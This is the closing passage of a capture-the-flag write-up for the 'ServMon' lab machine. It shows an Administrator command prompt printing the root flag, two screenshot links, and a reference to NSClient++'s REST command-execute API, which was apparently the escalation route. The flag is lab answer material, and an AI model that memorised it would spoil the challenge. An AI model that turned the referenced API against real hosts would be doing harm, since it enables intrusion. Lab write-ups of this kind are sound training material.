               1 File(s)             34 bytes
               2 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
fbb4677e30b545a5a9502b31a8bfa1bd

C:\Users\Administrator\Desktop>
```

![11](/assets/images/htb-machine-servmon/11.png)

![12](/assets/images/htb-machine-servmon/12.png)


Reference:
1. NSClient++ 0.5.2 API REST Queries https://docs.nsclient.org/api/rest/queries/#command-execute

 
